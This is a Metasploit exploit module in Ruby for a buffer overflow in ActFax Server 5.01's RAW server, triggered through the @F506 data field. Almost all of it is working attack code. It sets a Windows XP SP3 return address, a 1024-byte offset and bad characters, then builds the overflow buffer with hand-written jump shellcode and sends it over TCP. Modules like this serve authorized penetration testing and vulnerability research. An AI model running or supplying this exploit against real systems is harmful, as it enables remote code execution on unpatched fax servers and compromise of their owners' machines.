 
class Metasploit3 < Msf::Exploit::Remote
 
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::Tcp
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;    => &#039;ActFax 5.01 RAW Server Buffer Overflow&#039;,
      &#039;Description&#039;  => %q{
          This module exploits a vulnerability in ActFax Server 5.01 RAW server. The RAW
        Server can be used to transfer fax messages without any underlying protocols. To
        note significant fields in the fax being transferred, like the fax number or the
        recipient, ActFax data fields can be used. This module exploits a buffer overflow
        in the handling of the @F506 fields due to the insecure usage of strcpy. This
        module has been tested successfully on ActFax 5.01 over Windows XP SP3 (English).
      },
      &#039;License&#039;    => MSF_LICENSE,
      &#039;Author&#039;    =>
        [
          &#039;Craig Freyman&#039;, # @cd1zz # discovery and Metasploit module
          &#039;corelanc0d3r&#039;, # Metasploit module
          &#039;juan vazquez&#039; # Metasploit module cleanup
        ],
      &#039;References&#039;  =>
        [
          [ &#039;OSVDB&#039;, &#039;89944&#039; ],
          [ &#039;BID&#039;, &#039;57789&#039; ],
          [ &#039;EDB&#039;, &#039;24467&#039; ],
          [ &#039;URL&#039;, &#039;http://www.pwnag3.com/2013/02/actfax-raw-server-exploit.html&#039; ]
        ],
      &#039;Platform&#039;  => &#039;win&#039;,
      &#039;Payload&#039;  =>
        {
          &#039;BadChars&#039; => (0x00..0x1f).to_a.pack("C*") + "\x40",
          &#039;DisableNops&#039; => true,
          &#039;Space&#039; => 1024,
          &#039;EncoderOptions&#039; =>
            {
              &#039;BufferRegister&#039; => &#039;ECX&#039;
            }
        },
      &#039;Targets&#039;     =>
        [
          [ &#039;ActFax 5.01 / Windows XP SP3&#039;,
            {
              &#039;Ret&#039;     =>  0x77c35459, # push esp # ret # msvcrt.dll
              &#039;Offset&#039;  =>  1024
            }
          ],
        ],
      &#039;Privileged&#039;   => false,
      &#039;DisclosureDate&#039; => &#039;Feb 5 2013&#039;,
      &#039;DefaultTarget&#039;   => 0))
 
  end
 
  def exploit
    connect
    p = payload.encoded
    buffer = p
    buffer << rand_text(target[&#039;Offset&#039;] - p.length)
    buffer << [target.ret].pack("V")
    buffer << "\x89\xe1" # mov ecx, esp
    buffer << "\x81\xC1\xFC\xFB\xFF\xFF" # add ecx, -1028
    buffer << "\x81\xC4\x6C\xEE\xFF\xFF" # add esp, -4500
    buffer << "\xE9\xE9\xFB\xFF\xFF" # jmp $-1042
    print_status("Trying target #{target.name}...")
    sock.put("@F506 "+buffer+"@\r\n\r\n")
    disconnect
  end
end

